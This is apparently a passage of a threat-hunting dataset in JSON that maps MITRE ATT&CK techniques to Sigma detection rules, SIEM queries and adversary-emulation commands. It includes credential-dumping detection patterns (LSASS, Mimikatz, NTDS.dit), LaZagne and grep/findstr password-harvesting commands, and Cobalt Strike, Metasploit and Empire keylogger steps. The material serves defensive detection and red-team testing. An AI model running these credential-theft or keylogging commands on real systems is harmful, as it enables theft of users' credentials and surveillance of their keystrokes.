-ma lsass.exe * .dmp'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 10\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SourceImage: '* \\ procdump * .exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0TargetImage: 'C: \\ Windows \\ system32 \\ lsass.exe'\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Judgement Panda Exfil Activity", "id": "b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee", "description": "Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike", "references": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "author": "Florian Roth", "date": "2019/02/21", "tags": ["attack.credential_access", "attack.t1081", "attack.t1003"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"Image": "*\\xcopy.exe", "CommandLine": "* /S /E /C /Q /H \\\\*"}, "selection2": {"Image": "*\\adexplorer.exe", "CommandLine": "* -snapshot \"\" c:\\users\\\\*"}, "condition": "selection1 or selection2"}, "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Antivirus Password Dumper Detection", "id": "78cc2dd2-7d20-4d32-93ff-057084c38b93", "description": "Detects a highly relevant Antivirus alert that reports a password dumper", "date": "2018/09/09", "modified": "2019/10/04", "author": "Florian Roth", "references": ["https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/"], "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"product": "antivirus"}, "detection": {"selection": {"Signature": ["*DumpCreds*", "*Mimikatz*", "*PWCrack*", "HTool/WCE", "*PSWtool*", "*PWDump*", "*SecurityTool*", "*PShlSpy*"]}, "condition": "selection"}, "fields": ["FileName", "User"], "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"title": "Detection of SafetyKatz", "id": "e074832a-eada-4fd7-94a1-10642b130e16", "status": "experimental", "description": "Detects possible SafetyKatz Behaviour", "references": ["https://github.com/GhostPack/SafetyKatz"], "tags": ["attack.credential_access", "attack.t1003"], "author": "Markus Neis", "date": "2018/07/24", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 11, "TargetFilename": "*\\Temp\\debug.bin"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "LSASS Memory Dump", "id": "5ef9853e-4d0e-4a70-846f-a9ca37d876da", "status": "experimental", "description": "Detects process LSASS memory dump using procdump or taskmgr based on the CallTrace pointing to dbghelp.dll or dbgcore.dll for win10", "author": "Samir Bousseaden", "references": ["https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html"], "tags": ["attack.t1003", "attack.s0002", "attack.credential_access"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 10, "TargetImage": "C:\\windows\\system32\\lsass.exe", "GrantedAccess": "0x1fffff", "CallTrace": ["*dbghelp.dll*", "*dbgcore.dll*"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Mimikatz Detection LSASS Access", "id": "0d894093-71bc-43c3-8c4d-ecfc28dcf5d9", "status": "experimental", "description": "Detects process access to LSASS which is typical for Mimikatz (0x1000 PROCESS_QUERY_ LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ INFORMATION \"only old versions\", 0x0010 PROCESS_VM_READ)", "references": ["https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow", "https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html"], "tags": ["attack.t1003", "attack.s0002", "attack.credential_access", "car.2019-04-004"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 10, "TargetImage": "C:\\windows\\system32\\lsass.exe", "GrantedAccess": ["0x1410", "0x1010"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Mimikatz In-Memory", "id": "c0478ead-5336-46c2-bd5e-b4c84bc3a36e", "status": "experimental", "description": "Detects certain DLL loads when Mimikatz gets executed", "references": ["https://securityriskadvisors.com/blog/post/detecting-in-memory-mimikatz/"], "tags": ["attack.s0002", "attack.t1003", "attack.lateral_movement", "attack.credential_access", "car.2019-04-004"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selector": {"EventID": 7, "Image": "C:\\Windows\\System32\\rundll32.exe"}, "dllload1": {"ImageLoaded": "*\\vaultcli.dll"}, "dllload2": {"ImageLoaded": "*\\wlanapi.dll"}, "exclusion": {"ImageLoaded": ["ntdsapi.dll", "netapi32.dll", "imm32.dll", "samlib.dll", "combase.dll", "srvcli.dll", "shcore.dll", "ntasn1.dll", "cryptdll.dll", "logoncli.dll"]}, "timeframe": "30s", "condition": "selector | near dllload1 and dllload2 and not exclusion"}, "falsepositives": ["unknown"], "level": "medium"}}, {"data_source": {"title": "Password Dumper Remote Thread in LSASS", "id": "f239b326-2f41-4d6b-9dfa-c846a60ef505", "description": "Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundreds of events.", "references": ["https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm"], "status": "stable", "author": "Thomas Patzke", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 8, "TargetImage": "C:\\Windows\\System32\\lsass.exe", "StartModule": null}, "condition": "selection"}, "tags": ["attack.credential_access", "attack.t1003", "attack.s0005"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "QuarksPwDump Dump File", "id": "847def9e-924d-4e90-b7c4-5f581395a2b4", "status": "experimental", "description": "Detects a dump file written by QuarksPwDump password dumper", "references": ["https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm"], "author": "Florian Roth", "date": "2018/02/10", "tags": ["attack.credential_access", "attack.t1003"], "level": "critical", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 11, "TargetFilename": "*\\AppData\\Local\\Temp\\SAM-*.dmp*"}, "condition": "selection"}, "falsepositives": ["Unknown"]}}, {"data_source": {"title": "LSASS Access Detected via Attack Surface Reduction", "id": "a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98", "description": "Detects Access to LSASS Process", "status": "experimental", "references": ["https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter"], "author": "Markus Neis", "date": "2018/08/26", "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"product": "windows_defender", "definition": "Requirements:Enabled Block credential stealing from the Windows local security authority subsystem (lsass.exe) from Attack Surface Reduction (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)"}, "detection": {"selection": {"EventID": 1121, "Path": "*\\lsass.exe"}, "condition": "selection"}, "falsepositives": ["Google Chrome GoogleUpdate.exe", "Some Taskmgr.exe related activity"], "level": "high"}}, {"data_source": {"title": "Mimikatz Use", "id": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8", "description": "This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)", "author": "Florian Roth", "date": "2017/01/10", "modified": "2019/10/11", "tags": ["attack.s0002", "attack.t1003", "attack.lateral_movement", "attack.credential_access", "car.2013-07-001", "car.2019-04-004"], "logsource": {"product": "windows"}, "detection": {"keywords": {"Message": ["* mimikatz *", "* mimilib *", "* <3 eo.oe *", "* eo.oe.kiwi *", "* privilege::debug *", "* sekurlsa::logonpasswords *", "* lsadump::sam *", "* mimidrv.sys *", "* p::d *", "* s::l *"]}, "condition": "keywords"}, "falsepositives": ["Naughty administrators", "Penetration test"], "level": "critical"}}, {"data_source": {"title": "Cmdkey Cached Credentials Recon", "id": "07f8bdc2-c9b3-472a-9817-5a670b872f53", "status": "experimental", "description": "Detects usage of cmdkey to look for cached credentials", "references": ["https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation", "https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx"], "author": "jmallette", "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\cmdkey.exe", "CommandLine": "* /list *"}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine", "User"], "falsepositives": ["Legitimate administrative tasks."], "level": "low"}}, {"data_source": {"title": "Mimikatz DC Sync", "id": "611eab06-a145-4dfa-a295-3ccc5c20f59a", "description": "Detects Mimikatz DC sync security events", "status": "experimental", "date": "2018/06/03", "modified": "2019/10/08", "author": "Benjamin Delpy, Florian Roth", "references": ["https://twitter.com/gentilkiwi/status/1003236624925413376", "https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2"], "tags": ["attack.credential_access", "attack.s0002", "attack.t1003"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4662, "Properties": ["*Replicating Directory Changes All*", "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"]}, "filter1": {"SubjectDomainName": "Window Manager"}, "filter2": {"SubjectUserName": ["NT AUTHORITY*", "*$"]}, "condition": "selection and not filter1 and not filter2"}, "falsepositives": ["Valid DC Sync that is not covered by the filters; please report"], "level": "high"}}, {"data_source": {"title": "Rubeus Hack Tool", "id": "7ec2c172-dceb-4c10-92c9-87c1881b7e18", "description": "Detects command line parameters used by Rubeus hack tool", "author": "Florian Roth", "references": ["https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/"], "date": "2018/12/19", "tags": ["attack.credential_access", "attack.t1003", "attack.s0005"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* asreproast *", "* dump /service:krbtgt *", "* kerberoast *", "* createnetonly /program:*", "* ptt /ticket:*", "* /impersonateuser:*", "* renew /ticket:*", "* asktgt /user:*", "* harvest /interval:*"]}, "condition": "selection"}, "falsepositives": ["unlikely"], "level": "critical"}}, {"data_source": {"title": "Possible Impacket SecretDump remote activity", "id": "252902e3-5830-4cf6-bf21-c22083dfd5cf", "description": "Detect AD credential dumping using impacket secretdump HKTL", "author": "Samir Bousseaden", "references": ["https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html"], "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"product": "windows", "service": "security", "description": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"}, "detection": {"selection": {"EventID": 5145, "ShareName": "\\\\*\\ADMIN$", "RelativeTargetName": "SYSTEM32\\\\*.tmp"}, "condition": "selection"}, "falsepositives": ["pentesting"], "level": "high"}}, {"data_source": {"action": "global", "title": "Malicious Service Install", "id": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed", "description": "This method detects well-known keywords of malicious services in the Windows System Eventlog", "author": "Florian Roth", "tags": ["attack.credential_access", "attack.t1003", "attack.s0005"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection1": {"EventID": [7045]}, "keywords": {"Message": ["*WCE SERVICE*", "*WCESERVICE*", "*DumpSvc*"]}, "quarkspwdump": {"EventID": 16, "HiveName": "*\\AppData\\Local\\Temp\\SAM*.dmp"}, "condition": "( selection1 and keywords ) or ( selection2 and keywords ) or quarkspwdump"}, "falsepositives": ["Unlikely"], "level": "high"}}, {"data_source": {"logsource": {"product": "windows", "service": "security"}, "detection": {"selection2": {"EventID": 4697}}}}, {"data_source": {"title": "WCE wceaux.dll Access", "id": "1de68c67-af5c-4097-9c85-fe5578e09e67", "status": "experimental", "description": "Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host", "author": "Thomas Patzke", "references": ["https://www.jpcert.or.jp/english/pub/sr/ir_research.html", "https://jpcertcc.github.io/ToolAnalysisResultSheet"], "tags": ["attack.credential_access", "attack.t1003", "attack.s0005"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [4656, 4658, 4660, 4663], "ObjectName": "*\\wceaux.dll"}, "condition": "selection"}, "falsepositives": ["Penetration testing"], "level": "critical"}}, {"data_source": {"title": "NotPetya Ransomware Activity", "id": "79aeeb41-8156-4fac-a0cd-076495ab82a1", "status": "experimental", "description": "Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil", "author": "Florian Roth, Tom Ueltschi", "references": ["https://securelist.com/schroedingers-petya/78870/", "https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100"], "tags": ["attack.execution", "attack.credential_access", "attack.defense_evasion", "attack.t1085", "attack.t1070", "attack.t1003", "car.2016-04-002"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"pipe_com": {"CommandLine": "*\\AppData\\Local\\Temp\\\\* \\\\.\\pipe\\\\*"}, "rundll32_dash1": {"Image": "*\\rundll32.exe", "CommandLine": "*.dat,#1"}, "perfc_keyword": ["*\\perfc.dat*"], "condition": "1 of them"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Admin activity"], "level": "critical"}}, {"data_source": {"title": "Process dump via comsvcs DLL", "id": "09e6d5c0-05b8-4ff8-9eeb-043046ec774c", "status": "experimental", "description": "Detects process memory dump via comsvcs.dll and rundll32", "references": ["https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/", "https://twitter.com/SBousseaden/status/1167417096374050817"], "author": "Modexp (idea)", "date": "2019/09/02", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"rundll_image": {"Image": "*\\rundll32.exe"}, "rundll_ofn": {"OriginalFileName": "RUNDLL32.EXE"}, "selection": {"CommandLine": ["*comsvcs*MiniDump*full*", "*comsvcs*MiniDumpW*full*"]}, "condition": "(rundll_image or rundll_ofn) and selection"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.credential_access", "attack.t1003"], "falsepositives": ["unknown"], "level": "medium"}}, {"data_source": {"title": "Password Dumper Activity on LSASS", "id": "aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c", "description": "Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN", "status": "experimental", "references": ["https://twitter.com/jackcr/status/807385668833968128"], "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4656, "ProcessName": "C:\\Windows\\System32\\lsass.exe", "AccessMask": "0x705", "ObjectType": "SAM_DOMAIN"}, "condition": "selection"}, "falsepositives": ["Unkown"], "level": "high"}}, {"data_source": {"title": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)", "id": "2afafd61-6aae-4df4-baed-139fa1f4c345", "description": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)", "status": "experimental", "references": ["https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm"], "author": "Thomas Patzke", "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*\\ntdsutil*"}, "condition": "selection"}, "falsepositives": ["NTDS maintenance"], "level": "high"}}, {"data_source": {"title": "Suspicious Use of Procdump", "id": "5afee48e-67dd-4e03-a783-f74259dcf998", "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable.", "status": "experimental", "references": ["Internal Research"], "author": "Florian Roth", "date": "2018/10/30", "modified": "2019/10/14", "tags": ["attack.defense_evasion", "attack.t1036", "attack.credential_access", "attack.t1003", "car.2013-05-009"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": ["* -ma *"]}, "selection2": {"CommandLine": ["* lsass*"]}, "selection3": {"CommandLine": ["* -ma ls*"]}, "condition": "( selection1 and selection2 ) or selection3"}, "falsepositives": ["Unlikely, because no one should dump an lsass process memory", "Another tool that uses the command line switches of Procdump"], "level": "medium"}}, {"data_source": {"title": "SAM Dump to AppData", "id": "839dd1e8-eda8-4834-8145-01beeee33acd", "status": "experimental", "description": "Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers", "tags": ["attack.credential_access", "attack.t1003"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "system", "definition": "The source of this type of event is Kernel-General"}, "detection": {"selection": {"EventID": 16}, "keywords": {"Message": ["*\\AppData\\Local\\Temp\\SAM-*.dmp *"]}, "condition": "all of them"}, "falsepositives": ["Penetration testing"], "level": "high"}}, {"data_source": {"title": "Suspicious SYSVOL Domain Group Policy Access", "id": "05f3c945-dcc8-4393-9f3d-af65077a8f86", "status": "experimental", "description": "Detects Access to Domain Group Policies stored in SYSVOL", "references": ["https://adsecurity.org/?p=2288", "https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100"], "author": "Markus Neis", "date": "2018/04/09", "modified": "2018/12/11", "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*\\SYSVOL\\\\*\\policies\\\\*"}, "condition": "selection"}, "falsepositives": ["administrative activity"], "level": "medium"}}, {"data_source": {"title": "Activity Related to NTDS.dit Domain Hash Retrieval", "id": "b932b60f-fdda-4d53-8eda-a170c1d97bbd", "status": "experimental", "description": "Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely", "author": "Florian Roth, Michael Haag", "references": ["https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/", "https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/", "https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/", "https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/", "https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/"], "tags": ["attack.credential_access", "attack.t1003"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["vssadmin.exe Delete Shadows", "vssadmin create shadow /for=C:", "copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit", "copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM", "vssadmin delete shadows /for=C:", "reg SAVE HKLM\\SYSTEM ", "esentutl.exe /y /vss *\\ntds.dit*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Administrative activity"], "level": "high"}}]}, {"technique_id": "T1081", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell laZagne.exe browsers [-f]", "name": "Cobalt Strike"}, {"source": "atomics/T1081/T1081.yaml", "command": "python2 laZagne.py all\n", "name": null}, {"source": "atomics/T1081/T1081.yaml", "command": "grep -ri password /\n", "name": null}, {"source": "atomics/T1081/T1081.yaml", "command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -Pattern password\n", "name": null}, {"source": "atomics/T1081/T1081.yaml", "command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "grep -riP password #{file_path}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "grep -riP password /", "name": null}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1081", "Built-in Windows Command": "", "Cobalt Strike": "", "Metasploit": "", "Description": "https://github.com/hassaanaliw/chromepass\nThis program attempts to collect passwords that Chrome stores."}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1081", "Built-in Windows Command": "", "Cobalt Strike": "shell laZagne.exe browsers [-f]", "Metasploit": "", "Description": "https://github.com/AlessandroZ/LaZagne (now part of pupy as a post-exploit module)\nThis program attempts to collect passwords from many different data sources related to browsers - it'll get passwords from Firefox, Chrome, Opera, IE.\nthe -f command on the browsers command call is specifically targeting Firefox"}}, {"Atomic Red Team Test - Credentials in Files": {"attack_technique": "T1081", "display_name": "Credentials in Files", "atomic_tests": [{"name": "Extract Browser and System credentials with LaZagne", "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "python2 laZagne.py all\n"}}, {"name": "Extract passwords with grep", "description": "Extracting credentials from files\n", "input_arguments": {"file_path": {"description": "Path to search", "type": "String", "default": "/"}}, "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "grep -ri password #{file_path}\n"}}, {"name": "Extracting passwords with findstr", "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -Pattern password\n"}}, {"name": "Access unattend.xml", "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n"}}]}}], "command_list": ["shell laZagne.exe browsers [-f]", "python2 laZagne.py all\n", "grep -ri password /\n", "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -Pattern password\n", "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n", "grep -riP password #{file_path}", "grep -riP password /"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"*findstr* /si pass*\"or process_command_line contains \"*select-string -Pattern pass*\"or process_command_line contains \"*list vdir*/text:password*\")", "name": "Credentials In Files"}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit type=execve a0=grep password", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" grep password | table host,user_name,bash_command", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}]}, {"technique_id": "T1056", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "starting the keylogger:\nkeylogger {x86|x64} {pid}\nwhen you're ready to view logs:\nview -> keylog\nwhen you're done keylogging:\njobs\njobkill {job id number}", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "starting the keylogger:\nkeyscan_start\nwhen you're ready to get the logs:\nkeyscan_dump\nwhen you're done keylogging:\nkeyscan_stop", "name": "Metasploit"}, {"source": "atomics/T1056/T1056.yaml", "command": "Set-Location $PathToAtomicsFolder\n.\\T1056\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log\n", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe Get-Keystrokes -LogPath C:\\key.log", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/USBKeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/USBKeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/xkeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/xkeylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keylogger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keylogger", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1056", "Built-in Windows Command": "", "Cobalt Strike": "starting the keylogger:\nkeylogger {x86|x64} {pid}\nwhen you're ready to view logs:\nview -> keylog\nwhen you're done keylogging:\njobs\njobkill {job id number}", "Metasploit": "starting the keylogger:\nkeyscan_start\nwhen you're ready to get the logs:\nkeyscan_dump\nwhen you're done keylogging:\nkeyscan_stop", "Description": "Keylogging is extremely useful to get credentials and other information from the victim, but make sure that you are keylogging in a process belonging to the user you want to spy on. Keylogging within a SYSTEM process will not get you the keystrokes of other users on the system. For Cobalt Strike, make sure you specifiy the correct architecture and PID for a process running as the target victim. For Metasploit, make sure you've migrated to a process that is running as the target victim (explore.exe is always good)."}}, {"Atomic Red Team Test - Input Capture": {"attack_technique": "T1056", "display_name": "Input Capture", "atomic_tests": [{"name": "Input Capture", "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log. \n", "supported_platforms": ["windows"], "input_arguments": {"filepath": {"description": "Name of the local file, include path.", "type": "Path", "default": "$env:TEMP\\key.log"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "Set-Location $PathToAtomicsFolder\n.\\T1056\\src\\Get-Keystrokes.ps1 -LogPath #{filepath}\n", "cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100132", "os": "windows", "parent_process": "powershell.exe", "commandline_string": "Get-Keystrokes -LogPath C:\\key.log", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "input_capture", "mitre_attack": "T1056", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/USBKeylogger", "ATT&CK Technique #1": "T1056", "ATT&CK Technique #2": "", "Technique": "Input Capture", "Concatenate for Python Dictionary": "\"powershell/collection/USBKeylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/keylogger", "ATT&CK Technique #1": "T1056", "ATT&CK Technique #2": "", "Technique": "Input Capture", "Concatenate for Python Dictionary": "\"powershell/collection/keylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/linux/keylogger", "ATT&CK Technique #1": "T1056", "ATT&CK Technique #2": "", "Technique": "Input Capture", "Concatenate for Python Dictionary": "\"python/collection/linux/keylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/linux/xkeylogger", "ATT&CK Technique #1": "T1056", "ATT&CK Technique #2": "", "Technique": "Input Capture", "Concatenate for Python Dictionary": "\"python/collection/linux/xkeylogger\":  [\"T1056\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/keylogger", "ATT&CK Technique #1": "T1056", "ATT&CK Technique #2": "", "Technique": "Input Capture", "Concatenate for Python Dictionary": "\"python/collection/osx/keylogger\":  [\"T1056\"],"}}], "command_list": ["starting the keylogger:\nkeylogger {x86|x64} {pid}\nwhen you're ready to view logs:\nview -> keylog\nwhen you're done keylogging:\njobs\njobkill {job id number}", "starting the keylogger:\nkeyscan_start\nwhen you're ready to get the logs:\nkeyscan_dump\nwhen you're done keylogging:\nkeyscan_stop", "Set-Location $PathToAtomicsFolder\n.\\T1056\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log\n", "powershell.exe Get-Keystrokes -LogPath C:\\key.log", "powershell/collection/USBKeylogger", "powershell/collection/USBKeylogger", "powershell/collection/keylogger", "powershell/collection/keylogger", "python/collection/linux/keylogger", "python/collection/linux/keylogger", "python/collection/linux/xkeylogger", "python/collection/linux/xkeylogger", "python/collection/osx/keylogger", "python/collection/osx/keylogger"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "Persistence:", "commands": [], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Persistence:", "Built-in Windows Command": "", "Cobalt Strike": "", "Metasploit": "", "Description": ""}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1015", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Sticky Keys Persistence via Registry Manipulations:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t 